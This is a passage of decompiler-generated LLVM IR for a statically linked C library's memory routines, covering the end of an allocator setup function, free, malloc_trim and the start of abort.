  %v3_80501b3 = inttoptr i32 %v2_80501b3 to i32*
  store i32 %v1_80501b0, i32* %v3_80501b3, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v0_80501ba = load i32, i32* @ecx, align 4
  store i32 %v0_80501ba, i32* %v3_80501ba, align 4
  br label %dec_label_pc_80501bd

dec_label_pc_80501bd:                             ; preds = %dec_label_pc_8050189, %dec_label_pc_80501ad
  store i32 %v3_805010f, i32* @ecx, align 4
  %v1_80501c1 = icmp eq i32 %v3_805010f, 0
  %v1_80501c3 = icmp eq i1 %v1_80501c1, false
  br i1 %v1_80501c3, label %dec_label_pc_805010f, label %dec_label_pc_80501c9

dec_label_pc_80501c9:                             ; preds = %dec_label_pc_80501bd, %dec_label_pc_80500fb
  store i32 %v4_80500f3, i32* @ecx, align 4
  %v15_80501cd = icmp eq i32 %v0_8050109, %v4_80500f3
  br i1 %v15_80501cd, label %dec_label_pc_8050251, label %dec_label_pc_80501d3

dec_label_pc_80501d3:                             ; preds = %dec_label_pc_80501c9
  %v4_80501d3 = add i32 %v0_8050109, 4
  br label %dec_label_pc_80500fb

dec_label_pc_80501dd:                             ; preds = %dec_label_pc_80501ec.preheader, %dec_label_pc_80501dd
  %v1_80501e120 = phi i32 [ 1, %dec_label_pc_80501ec.preheader ], [ %v0_80501ec.pre, %dec_label_pc_80501dd ]
  %v2_80501e1 = mul i32 %v1_80501e120, 8
  %v4_80501e1 = add i32 %v3_80501e1, %v2_80501e1
  store i32 %v4_80501e1, i32* %eax.global-to-local, align 4
  %v1_80501e5 = add i32 %v1_80501e120, 1
  store i32 %v1_80501e5, i32* %edx.global-to-local, align 4
  %v2_80501e6 = add i32 %v4_80501e1, 12
  %v3_80501e6 = inttoptr i32 %v2_80501e6 to i32*
  store i32 %v4_80501e1, i32* %v3_80501e6, align 4
  %v0_80501e9 = load i32, i32* %eax.global-to-local, align 4
  %v2_80501e9 = add i32 %v0_80501e9, 8
  %v3_80501e9 = inttoptr i32 %v2_80501e9 to i32*
  store i32 %v0_80501e9, i32* %v3_80501e9, align 4
  %v0_80501ec.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_80501ef = icmp sgt i32 %v0_80501ec.pre, 95
  br i1 %v7_80501ef, label %dec_label_pc_80501f1, label %dec_label_pc_80501dd

dec_label_pc_80501f1:                             ; preds = %dec_label_pc_80501dd
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_80501f5 = add i32 %tmp11, 864
  %v2_80501f5 = inttoptr i32 %v1_80501f5 to i32*
  %v3_80501f5 = load i32, i32* %v2_80501f5, align 4
  %v4_80501f5 = or i32 %v3_80501f5, 1
  store i32 %v4_80501f5, i32* %v2_80501f5, align 4
  %v0_80501fc = load i32, i32* %eax.global-to-local, align 4
  %v1_80501fc = add i32 %v0_80501fc, 840
  %v2_80501fc = inttoptr i32 %v1_80501fc to i32*
  store i32 0, i32* %v2_80501fc, align 4
  %v0_8050206 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050206 = add i32 %v0_8050206, 852
  %v2_8050206 = inttoptr i32 %v1_8050206 to i32*
  store i32 65536, i32* %v2_8050206, align 4
  %v0_8050210 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050210 = add i32 %v0_8050210, 844
  %v2_8050210 = inttoptr i32 %v1_8050210 to i32*
  store i32 262144, i32* %v2_8050210, align 4
  %v0_805021a = load i32, i32* %eax.global-to-local, align 4
  %v1_805021a = add i32 %v0_805021a, 836
  %v2_805021a = inttoptr i32 %v1_805021a to i32*
  store i32 262144, i32* %v2_805021a, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v2_805022b = load i32, i32* %arg1, align 4
  %v1_805022d = urem i32 %v2_805022b, 4
  %v1_8050230 = or i32 %v1_805022d, 72
  store i32 %v1_8050230, i32* %arg1, align 4
  %v0_8050235 = load i32, i32* @edx, align 4
  %v1_8050237 = add i32 %v0_8050235, 52
  store i32 %v1_8050237, i32* %eax.global-to-local, align 4
  %v2_805023a = add i32 %v0_8050235, 44
  %v3_805023a = inttoptr i32 %v2_805023a to i32*
  store i32 %v1_8050237, i32* %v3_805023a, align 4
  %v1_805023f = call i32 @sysconf(i32 30)
  store i32 %v1_805023f, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_805024b = add i32 %tmp11, 860
  %v3_805024b = inttoptr i32 %v2_805024b to i32*
  store i32 %v1_805023f, i32* %v3_805024b, align 4
  br label %dec_label_pc_8050251

dec_label_pc_8050251:                             ; preds = %dec_label_pc_80501c9, %dec_label_pc_80501f1
  store i32 %v0_80500b4, i32* @ebx, align 4
  store i32 %v0_80500b3, i32* @esi, align 4
  store i32 %v0_80500b2, i32* @edi, align 4
  %v0_8050258 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8050258

; uselistorder directives
  uselistorder i32 %v0_80501e9, { 1, 0 }
  uselistorder i32 %v0_80501a8, { 1, 0 }
  uselistorder i32 %v1_8050163, { 1, 0 }
  uselistorder i32 %v2_805015c, { 1, 0 }
  uselistorder i32 %v1_8050154, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8050160, { 1, 0 }
  uselistorder i32 %v3_805010f, { 2, 1, 3, 0 }
  uselistorder i32 %v0_805012c, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8050109, { 1, 0, 3, 2 }
  uselistorder i32* %v3_80501ba, { 1, 0 }
  uselistorder i32 %v1_80500d4, { 1, 0 }
  uselistorder i32 %tmp11, { 3, 14, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 25, 26, 27, 28 }
  uselistorder i32 860, { 1, 0 }
  uselistorder i32 (i32)* @sysconf, { 1, 0 }
  uselistorder label %dec_label_pc_8050251, { 1, 0 }
  uselistorder label %dec_label_pc_80501dd, { 1, 0 }
  uselistorder label %dec_label_pc_80501bd, { 1, 0 }
  uselistorder label %dec_label_pc_8050189, { 1, 0 }
  uselistorder label %dec_label_pc_8050181, { 1, 0 }
  uselistorder label %dec_label_pc_805014c, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8050259 = load i32, i32* @ebp, align 4
  %v0_805025a = load i32, i32* @edi, align 4
  %v0_805025b = load i32, i32* @esi, align 4
  %v0_805025c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8050264 = icmp eq i32 %arg1, 0
  br i1 %v1_8050264, label %dec_label_pc_80503ed, label %dec_label_pc_805026c

dec_label_pc_805026c:                             ; preds = %entry
  %v2_8050277 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8050277, i32* @eax, align 4
  %v2_805027c = call i32 @__pthread_return_void(i32 %v2_8050277, i32 134548959)
  store i32 %v2_805027c, i32* %eax.global-to-local, align 4
  %v1_8050288 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80552f0.117 to i32))
  %v1_805028d = add i32 %arg1, -8
  store i32 %v1_805028d, i32* @ecx, align 4
  %v0_8050290 = load i8, i8* @global_var_805b540.118, align 1
  %v1_8050290 = sext i8 %v0_8050290 to i32
  store i32 %v1_8050290, i32* %eax.global-to-local, align 4
  %v1_8050298 = add i32 %arg1, -4
  %v2_8050298 = inttoptr i32 %v1_8050298 to i32*
  %v3_8050298 = load i32, i32* %v2_8050298, align 4
  %v1_805029d = and i32 %v3_8050298, -4
  %v4_805029d = trunc i32 %v1_805029d to i8
  store i32 %v1_805029d, i32* @ebx, align 4
  %v8_80502a2 = icmp ugt i8 %v4_805029d, %v0_8050290
  br i1 %v8_80502a2, label %dec_label_pc_80502c4, label %dec_label_pc_80502a4

dec_label_pc_80502a4:                             ; preds = %dec_label_pc_805026c
  %v2_80502a4 = udiv i32 %v3_8050298, 8
  %v1_80502a7 = or i32 %v1_8050290, 3
  %v3_80502a7 = trunc i32 %v1_80502a7 to i8
  store i32 %v1_80502a7, i32* %eax.global-to-local, align 4
  store i8 %v3_80502a7, i8* @global_var_805b540.118, align 64
  %v1_80502af = mul nuw i32 %v2_80502a4, 4
  %v2_80502af = add i32 %v1_80502af, ptrtoint (i8* @global_var_805b540.118 to i32)
  store i32 %v2_80502af, i32* @edx, align 4
  %v1_80502b6 = add i32 %v1_80502af, add (i32 ptrtoint (i8* @global_var_805b540.118 to i32), i32 -4)
  %v2_80502b6 = inttoptr i32 %v1_80502b6 to i32*
  %v3_80502b6 = load i32, i32* %v2_80502b6, align 4
  store i32 %v3_80502b6, i32* %eax.global-to-local, align 4
  %v3_80502b9 = inttoptr i32 %arg1 to i32*
  store i32 %v3_80502b6, i32* %v3_80502b9, align 4
  %v0_80502bc = load i32, i32* @ecx, align 4
  %v1_80502bc = load i32, i32* @edx, align 4
  %v2_80502bc = add i32 %v1_80502bc, -4
  %v3_80502bc = inttoptr i32 %v2_80502bc to i32*
  store i32 %v0_80502bc, i32* %v3_80502bc, align 4
  br label %dec_label_pc_80503dc

dec_label_pc_80502c4:                             ; preds = %dec_label_pc_805026c
  %v1_80502c4 = trunc i32 %v3_8050298 to i8
  %v2_80502c4 = and i8 %v1_80502c4, 2
  %v3_80502c4 = icmp eq i8 %v2_80502c4, 0
  %v5_80502c4 = zext i8 %v2_80502c4 to i32
  %v7_80502c4 = and i32 %v3_8050298, -256
  %v8_80502c4 = or i32 %v5_80502c4, %v7_80502c4
  store i32 %v8_80502c4, i32* @edx, align 4
  %v1_80502c7 = icmp eq i1 %v3_80502c4, false
  br i1 %v1_80502c7, label %dec_label_pc_80503bc, label %dec_label_pc_80502cd

dec_label_pc_80502cd:                             ; preds = %dec_label_pc_80502c4
  %v1_80502cd = or i32 %v1_8050290, 1
  %v3_80502cd = trunc i32 %v1_80502cd to i8
  store i32 %v1_80502cd, i32* %eax.global-to-local, align 4
  %v2_80502d0 = add i32 %v1_805029d, %v1_805028d
  store i32 %v2_80502d0, i32* @esi, align 4
  store i8 %v3_80502cd, i8* @global_var_805b540.118, align 64
  %v1_80502d8 = add i32 %v2_80502d0, 4
  %v2_80502d8 = inttoptr i32 %v1_80502d8 to i32*
  %v3_80502d8 = load i32, i32* %v2_80502d8, align 4
  store i32 %v3_80502d8, i32* %eax.global-to-local, align 4
  %v2_80502df = inttoptr i32 %v1_8050298 to i8*
  %v3_80502df = load i8, i8* %v2_80502df, align 1
  %v4_80502df = urem i8 %v3_80502df, 2
  %v5_80502df = icmp eq i8 %v4_80502df, 0
  %v1_80502e3 = icmp eq i1 %v5_80502df, false
  br i1 %v1_80502e3, label %dec_label_pc_8050306, label %dec_label_pc_80502e5

dec_label_pc_80502e5:                             ; preds = %dec_label_pc_80502cd
  %v2_80502e5 = inttoptr i32 %v1_805028d to i32*
  %v3_80502e5 = load i32, i32* %v2_80502e5, align 4
  store i32 %v3_80502e5, i32* @ebp, align 4
  %v2_80502ea = sub i32 %v1_805028d, %v3_80502e5
  store i32 %v2_80502ea, i32* %eax.global-to-local, align 4
  %v1_80502ec = add i32 %v2_80502ea, 8
  %v2_80502ec = inttoptr i32 %v1_80502ec to i32*
  %v3_80502ec = load i32, i32* %v2_80502ec, align 4
  store i32 %v3_80502ec, i32* @edi, align 4
  %v1_80502ef = add i32 %v2_80502ea, 12
  %v2_80502ef = inttoptr i32 %v1_80502ef to i32*
  %v3_80502ef = load i32, i32* %v2_80502ef, align 4
  store i32 %v3_80502ef, i32* @edx, align 4
  %v1_80502f2 = add i32 %v3_80502ec, 12
  %v2_80502f2 = inttoptr i32 %v1_80502f2 to i32*
  %v3_80502f2 = load i32, i32* %v2_80502f2, align 4
  store i32 %v3_80502f2, i32* @ecx, align 4
  %v12_80502f5 = icmp eq i32 %v3_80502f2, %v2_80502ea
  %v1_80502f7 = icmp eq i1 %v12_80502f5, false
  br i1 %v1_80502f7, label %dec_label_pc_8050335, label %dec_label_pc_80502f9

dec_label_pc_80502f9:                             ; preds = %dec_label_pc_80502e5
  %v1_80502f9 = add i32 %v3_80502ef, 8
  %v2_80502f9 = inttoptr i32 %v1_80502f9 to i32*
  %v3_80502f9 = load i32, i32* %v2_80502f9, align 4
  %v15_80502f9 = icmp eq i32 %v3_80502f9, %v3_80502f2
  %v1_80502fc = icmp eq i1 %v15_80502f9, false
  br i1 %v1_80502fc, label %dec_label_pc_8050335, label %dec_label_pc_80502fe

dec_label_pc_80502fe:                             ; preds = %dec_label_pc_80502f9
  %v2_80502fe = add i32 %v3_80502e5, %v1_805029d
  store i32 %v2_80502fe, i32* @ebx, align 4
  store i32 %v3_80502ef, i32* %v2_80502f2, align 4
  %v0_8050303 = load i32, i32* @edi, align 4
  %v1_8050303 = load i32, i32* @edx, align 4
  %v2_8050303 = add i32 %v1_8050303, 8
  %v3_8050303 = inttoptr i32 %v2_8050303 to i32*
  store i32 %v0_8050303, i32* %v3_8050303, align 4
  %v0_805030d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050306

dec_label_pc_8050306:                             ; preds = %dec_label_pc_80502cd, %dec_label_pc_80502fe
  %v1_8050319 = phi i32 [ %v2_80502d0, %dec_label_pc_80502cd ], [ %v0_805030d.pre, %dec_label_pc_80502fe ]
  %v1_805030a = and i32 %v3_80502d8, -4
  store i32 %v1_805030a, i32* @ebp, align 4
  %v1_805030d = load i32, i32* @global_var_805b56c.119, align 4
  %v12_805030d = icmp eq i32 %v1_8050319, %v1_805030d
  br i1 %v12_805030d, label %dec_label_pc_8050367, label %dec_label_pc_8050315

dec_label_pc_8050315:                             ; preds = %dec_label_pc_8050306
  %v2_8050315 = add i32 %v1_8050319, 4
  %v3_8050315 = add i32 %v2_8050315, %v1_805030a
  %v4_8050315 = inttoptr i32 %v3_8050315 to i32*
  %v5_8050315 = load i32, i32* %v4_8050315, align 4
  store i32 %v5_8050315, i32* %eax.global-to-local, align 4
  %v3_8050319 = inttoptr i32 %v2_8050315 to i32*
  store i32 %v1_805030a, i32* %v3_8050319, align 4
  %v0_805031c = load i32, i32* %eax.global-to-local, align 4
  %v1_805031c = urem i32 %v0_805031c, 2
  %v2_805031c = icmp eq i32 %v1_805031c, 0
  store i32 %v1_805031c, i32* %eax.global-to-local, align 4
  %v1_8050321 = icmp eq i1 %v2_805031c, false
  br i1 %v1_8050321, label %dec_label_pc_8050342, label %dec_label_pc_8050323

dec_label_pc_8050323:                             ; preds = %dec_label_pc_8050315
  %v0_8050323 = load i32, i32* @esi, align 4
  %v1_8050323 = add i32 %v0_8050323, 8
  %v2_8050323 = inttoptr i32 %v1_8050323 to i32*
  %v3_8050323 = load i32, i32* %v2_8050323, align 4
  store i32 %v3_8050323, i32* @edx, align 4
  %v1_8050326 = add i32 %v0_8050323, 12
  %v2_8050326 = inttoptr i32 %v1_8050326 to i32*
  %v3_8050326 = load i32, i32* %v2_8050326, align 4
  store i32 %v3_8050326, i32* %eax.global-to-local, align 4
  %v1_8050329 = add i32 %v3_8050323, 12
  %v2_8050329 = inttoptr i32 %v1_8050329 to i32*
  %v3_8050329 = load i32, i32* %v2_8050329, align 4
  store i32 %v3_8050329, i32* @edi, align 4
  %v12_805032c = icmp eq i32 %v3_8050329, %v0_8050323
  %v1_805032e = icmp eq i1 %v12_805032c, false
  br i1 %v1_805032e, label %dec_label_pc_8050335, label %dec_label_pc_8050330

dec_label_pc_8050330:                             ; preds = %dec_label_pc_8050323
  %v1_8050330 = add i32 %v3_8050326, 8
  %v2_8050330 = inttoptr i32 %v1_8050330 to i32*
  %v3_8050330 = load i32, i32* %v2_8050330, align 4
  %v15_8050330 = icmp eq i32 %v3_8050330, %v3_8050329
  br i1 %v15_8050330, label %dec_label_pc_805033a, label %dec_label_pc_8050335

dec_label_pc_8050335:                             ; preds = %dec_label_pc_8050330, %dec_label_pc_8050323, %dec_label_pc_80502f9, %dec_label_pc_80502e5
  %v0_8050335 = call i32 @abort()
  store i32 %v0_8050335, i32* %eax.global-to-local, align 4
  %v1_805033a.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805033a

dec_label_pc_805033a:                             ; preds = %dec_label_pc_8050330, %dec_label_pc_8050335
  %v1_805033a = phi i32 [ %v3_8050323, %dec_label_pc_8050330 ], [ %v1_805033a.pre, %dec_label_pc_8050335 ]
  %v0_805033a = phi i32 [ %v3_8050326, %dec_label_pc_8050330 ], [ %v0_8050335, %dec_label_pc_8050335 ]
  %v2_805033a = add i32 %v1_805033a, 12
  %v3_805033a = inttoptr i32 %v2_805033a to i32*
  store i32 %v0_805033a, i32* %v3_805033a, align 4
  %v0_805033d = load i32, i32* @edx, align 4
  %v1_805033d = load i32, i32* %eax.global-to-local, align 4
  %v2_805033d = add i32 %v1_805033d, 8
  %v3_805033d = inttoptr i32 %v2_805033d to i32*
  store i32 %v0_805033d, i32* %v3_805033d, align 4
  %v0_8050340 = load i32, i32* @ebx, align 4
  %v1_8050340 = load i32, i32* @ebp, align 4
  %v2_8050340 = add i32 %v1_8050340, %v0_8050340
  store i32 %v2_8050340, i32* @ebx, align 4
  br label %dec_label_pc_8050342

dec_label_pc_8050342:                             ; preds = %dec_label_pc_8050315, %dec_label_pc_805033a
  %v0_8050342 = load i32, i32* @global_var_805b57c.137, align 4
  store i32 %v0_8050342, i32* %eax.global-to-local, align 4
  %v0_8050347 = load i32, i32* @ecx, align 4
  %v1_8050347 = add i32 %v0_8050347, 12
  %v2_8050347 = inttoptr i32 %v1_8050347 to i32*
  store i32 ptrtoint (i32* @global_var_805b574.121 to i32), i32* %v2_8050347, align 4
  %v0_805034e = load i32, i32* %eax.global-to-local, align 4
  %v1_805034e = load i32, i32* @ecx, align 4
  %v2_805034e = add i32 %v1_805034e, 8
  %v3_805034e = inttoptr i32 %v2_805034e to i32*
  store i32 %v0_805034e, i32* %v3_805034e, align 4
  %v0_8050351 = load i32, i32* @ebx, align 4
  %v1_8050351 = load i32, i32* @ecx, align 4
  %v3_8050351 = add i32 %v1_8050351, %v0_8050351
  %v4_8050351 = inttoptr i32 %v3_8050351 to i32*
  store i32 %v0_8050351, i32* %v4_8050351, align 4
  %v0_8050354 = load i32, i32* @ecx, align 4
  %v1_8050354 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050354 = add i32 %v1_8050354, 12
  %v3_8050354 = inttoptr i32 %v2_8050354 to i32*
  store i32 %v0_8050354, i32* %v3_8050354, align 4
  %v0_8050357 = load i32, i32* @ebx, align 4
  %v1_8050359 = or i32 %v0_8050357, 1
  store i32 %v1_8050359, i32* %eax.global-to-local, align 4
  %v0_805035c = load i32, i32* @ecx, align 4
  store i32 %v0_805035c, i32* @global_var_805b57c.137, align 4
  %v2_8050362 = add i32 %v0_805035c, 4
  %v3_8050362 = inttoptr i32 %v2_8050362 to i32*
  store i32 %v1_8050359, i32* %v3_8050362, align 4
  br label %dec_label_pc_8050377

dec_label_pc_8050367:                             ; preds = %dec_label_pc_8050306
  %v0_8050367 = load i32, i32* @ebx, align 4
  %v2_8050367 = add i32 %v0_8050367, %v1_805030a
  store i32 %v2_8050367, i32* @ebx, align 4
  %v1_805036b = or i32 %v2_8050367, 1
  store i32 %v1_805036b, i32* %eax.global-to-local, align 4
  %v1_805036e = load i32, i32* @ecx, align 4
  %v2_805036e = add i32 %v1_805036e, 4
  %v3_805036e = inttoptr i32 %v2_805036e to i32*
  store i32 %v1_805036b, i32* %v3_805036e, align 4
  %v0_8050371 = load i32, i32* @ecx, align 4
  store i32 %v0_8050371, i32* @global_var_805b56c.119, align 4
  br label %dec_label_pc_8050377

dec_label_pc_8050377:                             ; preds = %dec_label_pc_8050342, %dec_label_pc_8050367
  %v0_8050377 = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_8050377, 131072
  br i1 %tmp21, label %dec_label_pc_80503dc, label %dec_label_pc_805037f

dec_label_pc_805037f:                             ; preds = %dec_label_pc_8050377
  %v0_805037f = load i8, i8* @global_var_805b540.118, align 64
  %v1_805037f = and i8 %v0_805037f, 2
  %v2_805037f = icmp eq i8 %v1_805037f, 0
  br i1 %v2_805037f, label %dec_label_pc_8050398, label %dec_label_pc_8050388

dec_label_pc_8050388:                             ; preds = %dec_label_pc_805037f
  %v2_8050390 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_805b540.118 to i32*))
  store i32 %v2_8050390, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050398

dec_label_pc_8050398:                             ; preds = %dec_label_pc_805037f, %dec_label_pc_8050388
  %v0_8050398 = load i32, i32* @global_var_805b56c.119, align 4
  store i32 %v0_8050398, i32* %eax.global-to-local, align 4
  %v1_805039d = add i32 %v0_8050398, 4
  %v2_805039d = inttoptr i32 %v1_805039d to i32*
  %v3_805039d = load i32, i32* %v2_805039d, align 4
  %v1_80503a0 = and i32 %v3_805039d, -4
  store i32 %v1_80503a0, i32* %eax.global-to-local, align 4
  %v1_80503a3 = load i32, i32* @global_var_805b884.135, align 4
  %v7_80503a3 = icmp ult i32 %v1_80503a0, %v1_80503a3
  br i1 %v7_80503a3, label %dec_label_pc_80503dc, label %dec_label_pc_80503ab

dec_label_pc_80503ab:                             ; preds = %dec_label_pc_8050398
  store i32 ptrtoint (i8* @global_var_805b540.118 to i32), i32* @edx, align 4
  %v0_80503b0 = load i32, i32* @global_var_805b888.133, align 8
  store i32 %v0_80503b0, i32* @eax, align 4
  %v0_80503b5 = call i32 @__malloc_trim()
  store i32 %v0_80503b5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80503dc

dec_label_pc_80503bc:                             ; preds = %dec_label_pc_80502c4
  %v2_80503bc = inttoptr i32 %v1_805028d to i32*
  %v3_80503bc = load i32, i32* %v2_80503bc, align 4
  %v0_80503bf = load i32, i32* @global_var_805b890.126, align 16
  %v1_80503bf = add i32 %v0_80503bf, -1
  store i32 %v1_80503bf, i32* @global_var_805b890.126, align 16
  %v2_80503c5 = add i32 %v3_80503bc, %v1_805029d
  store i32 %v2_80503c5, i32* %eax.global-to-local, align 4
  %v2_80503c8 = sub i32 %v1_805028d, %v3_80503bc
  %v0_80503ce = load i32, i32* @global_var_805b8a4.129, align 4
  %v2_80503ce = sub i32 %v0_80503ce, %v2_80503c5
  store i32 %v2_80503ce, i32* @global_var_805b8a4.129, align 4
  %v4_80503d4 = call i32 @munmap(i32 %v2_80503c8, i32 %v2_80503c5, i32 %v1_805029d, i32 %v1_805029d)
  store i32 %v4_80503d4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80503dc

dec_label_pc_80503dc:                             ; preds = %dec_label_pc_8050398, %dec_label_pc_8050377, %dec_label_pc_80503ab, %dec_label_pc_80502a4, %dec_label_pc_80503bc
  store i32 %v2_8050277, i32* @eax, align 4
  %v2_80503e5 = call i32 @__pthread_return_void(i32 %v2_8050277, i32 1)
  store i32 %v2_80503e5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80503ed

dec_label_pc_80503ed:                             ; preds = %entry, %dec_label_pc_80503dc
  %.0 = phi i32 [ undef, %entry ], [ %v2_80503e5, %dec_label_pc_80503dc ]
  store i32 %v0_805025c, i32* @ebx, align 4
  store i32 %v0_805025b, i32* @esi, align 4
  store i32 %v0_805025a, i32* @edi, align 4
  store i32 %v0_8050259, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_80503bc, { 1, 0 }
  uselistorder i32 %v0_8050351, { 1, 0 }
  uselistorder i32 %v1_805031c, { 1, 0 }
  uselistorder i32 %v2_8050315, { 1, 0 }
  uselistorder i32 %v1_805030a, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8050319, { 1, 0 }
  uselistorder i32 %v1_805029d, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_8050298, { 1, 2, 0, 3 }
  uselistorder i32 %v1_805028d, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_805b540.118 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_805b574.121 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_805b56c.119, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_80503ed, { 1, 0 }
  uselistorder label %dec_label_pc_80503dc, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8050398, { 1, 0 }
  uselistorder label %dec_label_pc_8050377, { 1, 0 }
  uselistorder label %dec_label_pc_8050342, { 1, 0 }
  uselistorder label %dec_label_pc_805033a, { 1, 0 }
  uselistorder label %dec_label_pc_8050306, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %v0_80503f5 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8050402 = call i32 @__malloc_consolidate(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_805b540.118 to i8) to i32) to i32*))
  %v0_8050407 = load i32, i32* @ebx, align 4
  store i32 %v0_8050407, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_805b540.118 to i32), i32* @edx, align 4
  store i32 %v0_80503f5, i32* @ebx, align 4
  %v0_8050412 = call i32 @__malloc_trim()
  ret i32 %v0_8050412

; uselistorder directives
  uselistorder i32 ()* @__malloc_trim, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_805b540.118 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_805b540.118, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_8050424 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8055308.138 to i32))
  %v12_805042e = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050433

dec_label_pc_8050433:                             ; preds = %dec_label_pc_8050433.dec_label_pc_8050433_crit_edge, %entry
  %v0_8050433 = phi i32 [ %v12_805042e, %entry ], [ %v0_8050433.pre, %dec_label_pc_8050433.dec_label_pc_8050433_crit_edge ]
  %v1_805043e22 = phi i32 [ 31, %entry ], [ %v1_805043e, %dec_label_pc_8050433.dec_label_pc_8050433_crit_edge ]
  %v2_8050433 = mul i32 %v1_805043e22, 4
  %v3_8050433 = add i32 %v2_8050433, 152
  %v4_8050433 = add i32 %v3_8050433, %v0_8050433
  %v5_8050433 = inttoptr i32 %v4_8050433 to i32*
  store i32 0, i32* %v5_8050433, align 4
  %v0_805043e.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_805043e = add i32 %v0_805043e.pre, -1
  %v9_805043e = icmp slt i32 %v1_805043e, 0
  store i32 %v1_805043e, i32* %eax.global-to-local, align 4
  %v1_805043f = icmp eq i1 %v9_805043e, false
  br i1 %v1_805043f, label %dec_label_pc_8050433.dec_label_pc_8050433_crit_edge, label %dec_label_pc_8050441

dec_label_pc_8050433.dec_label_pc_8050433_crit_edge: ; preds = %dec_label_pc_8050433
  %v0_8050433.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050433

dec_label_pc_8050441:                             ; preds = %dec_label_pc_8050433
  %v0_8050441 = load i32, i32* @ebx, align 4
  %v2_8050445 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8050445, i32* @ebx, align 4
  %v4_805044d = call i32 @__sigaddset(i32 %v2_8050445, i32 6, i32 %v0_8050441, i32 %v0_8050441)
  store i32 %v4_805044d, i32* %eax.global-to-local, align 4
  %v1_8050455 = icmp eq i32 %v4_805044d, 0
  %v1_8050457 = icmp eq i1 %v1_8050455, false
  br i1 %v1_8050457, label %dec_label_pc_8050467, label %dec_label_pc_8050459

dec_label_pc_8050459:                             ; preds = %dec_label_pc_8050441
  %v3_805045f = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_805045f = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_805045f, i32 0)
  store i32 %v4_805045f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050467

dec_label_pc_8050467:                             ; preds = %dec_label_pc_8050441, %dec_label_pc_8050459
  %v2_805049f4 = phi i32 [ %v4_805044d, %dec_label_pc_8050441 ], [ %v4_805045f, %dec_label_pc_8050459 ]
  %v0_8050467 = load i8, i8* @global_var_805b474.139, align 4
  %v1_8050467 = icmp eq i8 %v0_8050467, 0
  %v1_805046e = icmp eq i1 %v1_8050467, false
  br i1 %v1_805046e, label %dec_label_pc_805049f, label %dec_label_pc_8050470

dec_label_pc_8050470:                             ; preds = %dec_label_pc_8050467
  store i8 1, i8* @global_var_805b474.139, align 4
  br label %dec_label_pc_8050477

dec_label_pc_8050477:                             ; preds = %dec_label_pc_80504de, %dec_label_pc_8050470
  %v1_805047f = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8055308.138 to i32))
  store i32 %v1_805047f, i32* %eax.global-to-local, align 4
  %v1_805048b = call i32 @__raise(i32 6)
  store i32 %v1_805048b, i32* %eax.global-to-local, align 4
  %v1_8050497 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8055308.138 to i32))
